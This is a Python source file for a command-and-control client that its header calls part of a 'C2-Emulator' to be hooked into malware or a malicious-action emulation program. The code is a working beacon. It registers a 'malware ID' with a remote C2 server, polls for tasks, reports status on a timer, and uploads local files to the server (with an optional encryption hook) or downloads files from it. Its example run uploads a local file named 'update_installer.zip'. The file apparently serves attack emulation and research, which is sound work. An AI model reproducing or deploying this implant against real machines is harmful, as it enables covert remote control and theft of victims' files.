#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        c2Client.py [python3]
#
# Purpose:     This module is the client running parallel with the malware or 
#              the the malicious action emulation program's main thread to 
#              communicate with the command and control (C2) hub.
#  
# Author:      Yuancheng Liu
#
# Created:     2023/09/02
# version:     v0.2.1
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Design purpose: 
    The C2 client is part of the C2-Emulator system which is hooked in the malicious 
    action emulation program / malware to : 
    1. Report the program action state (result) to the C2 server. 
    2. Fetch the assigned tasks detailed information from the C2 server.
    3. Handle the file translate between C2. 
    - 3.1 upload / download file from C2. 
    - 3.2 accept file sent from C2 and submit the required file to C2.
"""
import os
import time
import requests
import threading
from queue import Queue

# define the constents: 
DFT_RPT_INV = 10    # defualt report C2 server time interval(sec)
MAX_C2_TASK = 10    # max number of tasks(accept from C2) can be enqueued  
MAX_C2_REPORT = 20  # max number of state(report to C2) can be enqueued

# define all the flag here.
TASK_P_FLG = 0  # task pending flag
TASK_F_FLG = 1  # task finish flag
TASK_A_FLG = 2  # task accept flag
TASK_E_FLG = 3  # task error flag
TASK_R_FLG = 4  # task running flag

# Define all the action flag here:
ACT_KEY = 'action'
ACCEPT_FLG = 'ok'
REJECT_FLG = 'no'

# Define all the task type flag here:
RIG_FLG = 'register' # register flag
RPT_FLG = 'report'
UPLOAD_FLG = 'upload'
DOWNLOAD_FLG = 'download'
CMD_FLG = 'command'

dirpath = os.path.dirname(__file__)

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class c2Client(threading.Thread):
    """ The C2 client will start a parallel thread with the hooked program's 
        main thread to handle the communication with the command and control 
        hub, the communication is using normal http (GET/POST) request.
    """
    def __init__(self, malwareID, c2Ipaddr, c2Port=5000, ownIP='127.0.0.1',
                 downloadDir=dirpath, reportInt=DFT_RPT_INV) -> None:
        """ Init example : 
                c2Connector = c2Client.c2Client(<unique ID>, <C2 IP>, ownIP=<self IP>)
                c2Connector.registerToC2()  # need to register malware to C2 before call other API functions.
                self.c2Connector.start()
            Args:
                malwareID (str): malware <unique ID>.
                c2Ipaddr (str): C2 server's public IP address.
                c2Port (int, optional): web http port. Defaults to 5000.
                ownIP (str, optional): own IP (victim). Defaults to '127.0.0.1'.
                downloadDir (Str): download file storage folder path. Defaults to 
                    same folder as C2Client.py
                reportInt (int): Time interval between return 2 C2.
        """
        threading.Thread.__init__(self)

        self.id = str(malwareID)
        self.ipaddr = ownIP
        self.freeFlg = True # flag to identify whether the malware is doing a task.
        # Init all C2 related parameters 
        self.c2Ipaddr = c2Ipaddr
        self.c2Port = c2Port
        self.c2taskQueue = Queue(maxsize=MAX_C2_TASK) # Queue to store Task assigned by the C2 
        #Task json example : 
        #c2TaskTemplate = {
        #    'taskID'   : 0,
        #    'taskType' : None, 
        #    'StartT'   : None,  # None means start immediatly if recevied 
        #    'repeat'   : 1,     # how many times to repeat the task.
        #    'ExPreT'   : 0,     # time to wait before execution
        #    'taskData' : None
        #}
        self.c2rptQueue = Queue(maxsize=MAX_C2_REPORT) # Queue to store data/message need to report to C2
        #Report json exmaple:
        #c2reportTemplate = {
        #    'taskID'   : 0,
        #    'state'    : TASK_P_FLG, 
        #    'time'     :  None,
        #    'taskData' : None 
        #}
        self.c2urlDict = self._getUrlDict() # Init all the C2 url 
        self.c2ReportInterval = reportInt 
        self.c2Connected = False 
        
        # Report mutual exclusion check, this function will make sure the client 
        # do task one by one, for example if the client is uploading a file to the C2
        # now if the user call the downloadfile() to download a file, the download 
        # task will wait until upload finished. Even our C2 is Mulit-threading, we want 
        # to reduce the load of C2 during tranfer files.
        self.reportLock = threading.Lock()  # report progress mutual exclusion lock flag 

        # function to process the file such as encryption or decryption.
        self.fileProcessFunction = None
        self.downloadDir = downloadDir
        if not os.path.isdir(self.downloadDir):
            print("Create the download storage folder: %s" %str(self.downloadDir))
            os.mkdir(self.downloadDir)
        self.terminate = False
        print("c2Client init finished.")

    #-----------------------------------------------------------------------------
    # define all the private function here : 
        
    def _getUrlDict(self):
        """ Init all the C2 urls in this function, over write this function if use 
            domain instead of IP or use different C2 config,.
        """
        return {
            'getFile'   : "http://%s:%s/filedownload" % (self.c2Ipaddr, str(self.c2Port)),
            'postData'  : "http://%s:%s/dataPost/" % (self.c2Ipaddr, str(self.c2Port)),
            'postFile'  : "http://%s:%s/fileupload" % (self.c2Ipaddr, str(self.c2Port))
        }

    #-----------------------------------------------------------------------------
    def _getData(self, getUrl, jsonDict, getFile=False):
        """ Send HTTP GET request to get data.
            Args:
                getUrl (str): url string 
                jsonDict (dict): json data send via GET.
                getFile (bool, optional): True: download file, False: get data. Defaults to False.
            Returns:
                1. file byte if can download file.
                2. data json dict if can get data.
                3. None if get failed or lose connection 
        """
        self.reportLock.acquire()
        try:
            res = requests.get(getUrl, json=jsonDict, allow_redirects=True) # set allow redirect to by pass load balancer
            if res.ok:
                self.reportLock.release()
                return res.content if getFile else res.json()
        except Exception as err:
            print("http server either not reachable or GET error: %s" % str(err))
            self.c2Connected = False
        # release the lock before return.
        if self.reportLock.locked():self.reportLock.release()
        return None

    #-----------------------------------------------------------------------------
    def _postData(self, postUrl, jsonDict, postfile=False):
        """ Send HTTP POST request to send data.
            Args:
                postUrl (str): url string
                jsonDict (_type_): json data send via POST.
                postfile (bool, optional): True: upload file, False: submit data/message.Defaults to False.
            Returns:
                _type_: Server repsonse or None if post failed/lose connection.
        """
        self.reportLock.acquire()
        try:
            res = requests.post(postUrl, files=jsonDict) if postfile else requests.post(postUrl, json=jsonDict)
            if res.ok:
                print("http server reply: %s" % str(res.json()))
                self.reportLock.release()
                return res.json()
        except Exception as err:
            print("http server either not reachable or POST error: %s" % str(err))
            self.c2Connected = False
        if self.reportLock.locked(): self.reportLock.release()
        return None

    #-----------------------------------------------------------------------------
    def _reportTohub(self, action=None, data=None):
        """ Package the input action flag and action data with own ID, then report to
            C2 via POST.
        """
        jsonDict = {
            'id': self.id,
            'free': self.freeFlg,
            ACT_KEY : action,
            'data': data}
        reportUrl = self.c2urlDict['postData'] + str(jsonDict['id'])
        return self._postData(reportUrl, jsonDict)

    #-----------------------------------------------------------------------------
    def run(self):
        print("Start the C2 client main loop.")
        while not self.terminate:
            if self.submitAllStateToC2():
                print("Reported the current state to C2")
            else:
                print("Try to get task from C2 Server.")
                self.fetchTaskFromC2()
            time.sleep(self.c2ReportInterval)
        print("C2 client main loop end.")

    #-----------------------------------------------------------------------------
    # define all the public function here : 

    def addNewTask(self, taskDict):
        """ Add a new task dict() to the C2 assigned task queue."""
        c2taskDict = {
            'taskID'    : 0,
            'taskType'  : None, 
            'StartT'    : None,  # None means start immediatly if recevied 
            'repeat'    : 1,     # how many times to repeat the task.
            'ExPreT'    : 0,     # time to wait before execution
            'state'     : TASK_A_FLG,
            'taskData'  : None
        }
        c2taskDict.update(taskDict)
        if self.c2taskQueue.full(): 
            print("C2Task queue full, can not add new task from C2.")
            return False
        self.c2taskQueue.put(c2taskDict)
        return True

    #-----------------------------------------------------------------------------
    def addNewReport(self, reportDict):
        """ Add a new task state to the report queue."""
        malwareRptDict = {
            'taskID'    : 0,
            'state'     : TASK_P_FLG, 
            'time'      : None, 
            'taskData'  : None
        }
        malwareRptDict.update(reportDict)
        #print('>> %s' %str(malwareRptDict))
        if self.c2rptQueue.full():
            print("C2Report queue full, can not add new report to C2.")
            return False
        self.c2rptQueue.put(malwareRptDict)

    #-----------------------------------------------------------------------------
    def fetchTaskFromC2(self):
        """ Try to fetch one task from C2."""
        if self.c2Connected:
            res = self._reportTohub(action='getTask', data=None)
            if res is None: return False
            if 'task' in res.keys():
                self.addNewTask(res['task'])
                print("Got new task: %s" %str(res['task']))
                return True
            else:
                print('Invalied task information: %s', str(res.keys()))
                return False

    #-----------------------------------------------------------------------------
    def getOneC2Task(self):
        """ Return one C2 task dict(). """
        return None if self.c2taskQueue.empty() else self.c2taskQueue.get() 

    #-----------------------------------------------------------------------------
    def registerToC2(self, taskList=[]):
        """ Register the parent malware to C2."""
        print("Start to register to the C2 [%s]..." % str(self.c2Ipaddr))
        dataDict = {'ipaddr': self.ipaddr, 
                    'tasks': taskList}
        res = self._reportTohub(action=RIG_FLG, data=dataDict)
        if not(res is None) and res['state'] == TASK_F_FLG:
            self.c2Connected = True
            print("Client connected to the C2 server.")
            return True
        return False

    #-----------------------------------------------------------------------------
    def submitAllStateToC2(self):
        """ Submit all the current stored malware state info in report queue to C2.
            Returns:
                _type_: True if submitted successful, False if submit nothing
        """
        if self.c2rptQueue.empty() or not self.c2Connected:return False
        reportList = []
        while not self.c2rptQueue.empty():
            report = self.c2rptQueue.get()
            print(report)
            reportList.append(report)
        res = self._reportTohub(action=RPT_FLG, data=reportList)
        return True
 
    #-----------------------------------------------------------------------------
    def transferFiles(self, filePathList, uploadFlg=True):
        """ Upload / download files to / from C2.
            Args:
                filePathList (list()): list of file upload or download.
                uploadFlg (bool, optional): True for uploading files, False for downloading
                    files. Defaults to True.
            Returns:
                bool: True if C2 allow upload/download, else False.
        """
        if uploadFlg:
            # Check whether C2 allows malware upload files.
            res = self._reportTohub(action=UPLOAD_FLG, data=filePathList)
            if res is None or res[UPLOAD_FLG] != ACCEPT_FLG: return False
            for filePath in filePathList:
                self.uploadfile(filePath, dataProcessFun=self.fileProcessFunction)
                time.sleep(0.1)  # sleep a short time after the file uploaded.
            return True
        else:
            # Check whether C2 allows malware download files.
            res = self._reportTohub(action=DOWNLOAD_FLG, data=filePathList)
            if res is None or res[DOWNLOAD_FLG] != ACCEPT_FLG: return False 
            for fileName in filePathList:
                self.downloadfile(fileName, 
                                  fileDir=self.downloadDir,
                                  dataProcessFun=self.fileProcessFunction)
                time.sleep(0.1)
            return True

    #-----------------------------------------------------------------------------
    def uploadfile(self, filePath, dataProcessFun=None):
        """ Upload a file which is smaller than the TCP max buffer size."""
        if os.path.exists(filePath):
            try:
                filename = os.path.basename(filePath)
                with open(filePath, 'rb') as fh:
                    filedata = fh.read() if dataProcessFun is None else dataProcessFun(fh.read())
                    uploadUrl = self.c2urlDict['postFile']
                    dataDict = {'file': (filename, filedata)}
                    print('uploading file %s ...' %str(filename))
                    res = self._postData(uploadUrl, dataDict, postfile=True)
                    return res
            except Exception as err:
                print("File IO error: %s" % str(err))
                return None
        else:
            print("Upload file : %s not exist" % str(filePath))
            return None

    #-----------------------------------------------------------------------------
    def downloadfile(self, filename, fileDir=None, dataProcessFun=None):
        """ Download a file from the C2 server"""
        if fileDir and not os.path.isdir(fileDir): os.mkdir(fileDir)
        filePath = os.path.join(dirpath, filename) if fileDir is None else os.path.join(fileDir, filename)
        uploadUrl = self.c2urlDict['getFile']
        dataDict = {"filename": filename}
        print('Downloading file %s ...' %str(filename))
        filedata = self._getData(uploadUrl, dataDict, getFile=True)
        if dataProcessFun: filedata = dataProcessFun(filedata)
        try:
            with open(filePath, 'wb') as fh:
                fh.write(filedata)
            return True
        except Exception as err:
            print("Create download file error : %s" %str(err))
            return None

    #-----------------------------------------------------------------------------
    def setClientLoopInv(self, timeInv):
        """ Set the client main loop sleep interval."""
        self.c2ReportInterval = int(timeInv)
    
    def setFileProcessFunction(self, func):
        """ Set the function to process the GET/POST data."""
        self.fileProcessFunction = func

    #-----------------------------------------------------------------------------
    def stop(self):
        print("Set the c2 client terminate flag.")
        self.terminate = True

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    from datetime import datetime
    client = c2Client('testMalware-0','127.0.0.1', c2Port=5000)
    client.registerToC2(taskList=[{
                'taskID': 0,
                'taskType': RIG_FLG,
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : TASK_R_FLG,
                'taskData': None
            }]
    )
    filePath = os.path.join(dirpath, 'update_installer.zip')
    client.uploadfile(filePath)
    client.downloadfile('2023-12-13_100327.png')

if __name__ == '__main__':
    main()
